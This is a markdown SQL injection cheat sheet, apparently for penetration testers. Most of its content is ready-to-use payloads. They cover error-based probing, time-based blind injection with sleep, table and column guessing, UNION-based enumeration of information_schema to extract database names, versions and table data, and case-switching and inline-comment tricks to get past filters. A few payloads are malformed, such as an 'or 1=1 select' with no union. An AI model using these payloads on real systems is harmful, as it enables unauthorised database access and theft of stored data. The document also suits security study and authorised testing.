## SQL-Injection-cheat-sheet

* First try to figure out the vulnerable parameter

__NOTE: If it's a GET request don't forget to url encode the characters.__

```
param='  --> try to get error

param="   --> try to get error

param=' or 1=1 --> try if it works

param=' or 1=0  --> check if it returns nothing

param=' and 1=1  --> check if this works or produces error
```

Try with blind injection payloads if above commands does not produce error

```

' or sleep(2) and 1=1#  --> try get delay, sleep only operates when all other conditions are true and there is a requirement to operate it.

' or sleep(2)#  --> try get delay

admin' and sleep(2)#  --> will delay only if the user admin exists

' union select sleep(2),null#  --> check if it produces delay

' union select sleep(2),null,null,null,null#  --> check if it produces delay, check for different number of columns

```


Try if above queries work by appending comment at the end

```
param=' or 1=1#  --> try if it works

param=' or 1=1 -- one space needed  --> try if it works

param=' or 1=1 //  --> try if it works

param= or 1=1#  --> try if it works

param=and or 1=1#  --> try if it works

param=' or 1=1-- sd  --> try if it works

' AND (select 1)=1 <-- This should be TRUE Response -- subselect supported

```

* Now that we know the vulnerable parameter, let's try guessing the table name:

```

' AND (select 1 from admin limit 0,1)=1 <-- FALSE

' AND (select 1 from users limit 0,1)=1 <-- TRUE  ======> Table found 'users'
```


* Guessing Columns:

```
' AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1 <-- FALSE

' AND (select substring(concat(1,password),1,1) from users limit 0,1)=1 <-- TRUE    =====> Column 'password' found.
```


* Now determine number of columns in the current table

```
param=' or 1=1 order by 1#

param=' or 1=1 order by 10#
```

let say there are 3 columns

* Now determine vulnerable columns or columns which are visible

```
param=' or 1=0 union select null,null,null# --> if it produces no error then try

param=' or 1=0 union select 1,2,3#  --> check which number shows in web page
```

Else try

```
param=' or 1=1 union select table_name,null,null from information_schema.tables#

if it produces error try table_name at other positions
```

Now, lets say column 1,2 are shown in web page

* To futher enumerate

```
param=' or 1=0 union select table_schema,null,null from information_schema.columns#  --> display all database name

Note 1=0 in above query to show only databases

param=' or 1=0 union select version(),null,null from information_schema.columns#  --> retrieve version

param=' or 1=0 union select @@version,null,null from information_schema.columns#  --> retrieve version in mssql

param=' or 1=0 union select substring(version(),1,1)=1,null,null from information_schema.columns#  --> return true if version is 1.x.x

param=' or 1=0 union select substring(version(),1,1)=5,null,null from information_schema.columns#  --> return true if version is 5.x.x

param=' or 1=0 union select substring(version(),3,1)=2,null,null from information_schema.columns#  --> return true if version is 5.2.x

param=' or 1=0 union select table_name,null,null from information_schema.columns#  --> display all table name

param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'#  --> display tables inside public database

param=' or 1=1 select column_name,null,null from information_schema.columns where table_schema='public' and table_name='info'#  --> display all columns of info table

param=' or 1=1 select table_name as table,column_name as column,null from information_schema.columns#
```

Let say the database name is `public` and table name is `info` with two columns in it `id` and `name`.


```
param=' or 1=0 union select id,null,null from public.info#  --> display id column from table "info"

param=' or 1=0 union select id,name,null from public.info#  --> display id and name column from table "info"

param=' or 1=0 union select id,name,null from public.info where id='papa'#  --> display id and name of 'papa'
```


* BYPASSING filters

we can use case switching or commenting to bypass basic filters

```
param=' or 1=0 UniOn selEct id,null,null FroM public.info#

param=' or 1=0 un/**/ion sele/**/ct id,null,null fr/**/om public.info# works in mssql
```

* For Oracle DB

Oracle does not have information schema and thus we need some alternatives for it. The link below can be helpful.

https://stackoverflow.com/questions/8739203/oracle-query-to-fetch-column-names


* For Adanced exploitation, we may use sqlmap

## Useful Resources

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

http://garage4hackers.com/showthread.php?t=1990


